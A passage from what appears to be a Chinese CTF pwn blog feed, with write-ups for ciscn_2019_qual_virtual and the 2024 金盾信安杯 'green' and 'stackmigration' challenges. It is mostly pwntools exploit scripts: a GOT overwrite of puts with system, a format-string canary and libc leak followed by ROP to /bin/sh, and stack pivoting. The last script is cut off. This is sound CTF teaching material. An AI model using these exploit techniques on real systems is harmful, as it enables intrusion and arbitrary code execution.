class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//copy(data_addr,*(data+idx+a2))</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data里取出一个值a2作为下标，并将该下标对应的值放入data中</p></li><li><p>save</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">save</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>data_addr <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token comment">//*(data+idx+v2)=v3</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data里取出值v2作为下标和v3作为值，将v3赋值给v2下标对应的值</p></li></ul><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>通过上面的分析，我们找到了两个漏洞，对堆的任意地址的读写漏洞。但是不好泄露地址怎么办，其实不需要泄露<br>，利用好给出的加减指令</p><ol><li><p>劫持 data 到一块空内存<br>劫持到bss上。<br>因为idx&#x3D;-1，所以偏移要加回去</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">push push save0x404650 -4+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>把 puts 真实地址读到该内存区域<br>算一下 puts_got 和劫持完成之后的 data 的偏移为 0xe0</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">push load-1c+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>获取 system 真实地址<br>计算 system 和 puts 的偏移，放到 data 上</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">push add-0x2a300<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>把 data 里的 system 地址赋值给 puts_got</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">push save-1c+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>save：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your program name:'</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>instruction <span class="token operator">=</span> <span class="token string">'push push save'</span>sla<span class="token punctuation">(</span><span class="token string">'Your instruction:'</span><span class="token punctuation">,</span>instruction<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x0000000000401D98\n')</span>stack<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> sla<span class="token punctuation">(</span><span class="token string">'Your stack data:'</span><span class="token punctuation">,</span>stack<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>load：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your program name:'</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>instruction <span class="token operator">=</span> <span class="token string">'push load'</span>sla<span class="token punctuation">(</span><span class="token string">'Your instruction:'</span><span class="token punctuation">,</span>instruction<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x00000000004014A0\n')</span>stack<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> sla<span class="token punctuation">(</span><span class="token string">'Your stack data:'</span><span class="token punctuation">,</span>stack<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>EXP</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your program name:'</span><span class="token punctuation">,</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>instruction <span class="token operator">=</span> <span class="token string">'push push save push load push add push save'</span>sla<span class="token punctuation">(</span><span class="token string">'Your instruction:'</span><span class="token punctuation">,</span>instruction<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x0000000000401D98\n')</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x00000000004014A0\n'</span><span class="token punctuation">)</span>puts_got<span class="token operator">=</span>eg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>stack<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x404100</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> stack<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x1c</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span>stack<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x2a300</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span>stack<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x1c</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Your stack data:'</span><span class="token punctuation">,</span>stack<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h","-l 150"]</span>binary<span class="token operator">=</span><span class="token string">'./ciscn_2019_qual_virtual'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 每周一pwn系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第六届金盾信安杯初赛2024</title>
      <link href="/2024/12/01/%E7%AC%AC%E5%85%AD%E5%B1%8A%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF%E5%88%9D%E8%B5%9B2024/"/>
      <url>/2024/12/01/%E7%AC%AC%E5%85%AD%E5%B1%8A%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF%E5%88%9D%E8%B5%9B2024/</url>
      
        <content type="html"><![CDATA[<h1 id="green"><a href="#green" class="headerlink" title="green"></a>green</h1><p>直接两个裸溢出，格式化字符串泄露canary和libc，然后直接走rop即可<br><img src="/EXP_FILE/8a89141e28cf39459be2df0feb35a2e0_MD5.jpeg"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#dbg('b *$rebase(0x0000132A)')</span>sla<span class="token punctuation">(</span><span class="token string">'Every protection is enabled. Good luck.'</span><span class="token punctuation">,</span><span class="token string">b'%15$p.%16$p'</span><span class="token punctuation">)</span><span class="token comment">#本地</span>ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>canary<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span>canary<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>stdout<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>stdout<span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh<span class="token operator">=</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *$rebase(0x00001363)'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">12</span><span class="token operator">+</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>system<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>binsh<span class="token punctuation">]</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./green'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="stackmigration"><a href="#stackmigration" class="headerlink" title="stackmigration"></a>stackmigration</h1><p>溢出了0x10字节，栈劫持到bss上走rop泄露libc，然后再劫持一次走system</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ru<span class="token punctuation">(</span><span class="token string">'Give you a gift:0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>leak<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak'</span><span class="token punctuation">,</span>leak<span class="token punctuation">)</span>read_leave_ret<span class="token operator">=</span><span class="token number">0x000000000040087F</span>leave_ret<span class="token operator">=</span><span class="token number">0x0000000000400896</span>bss<span class="token 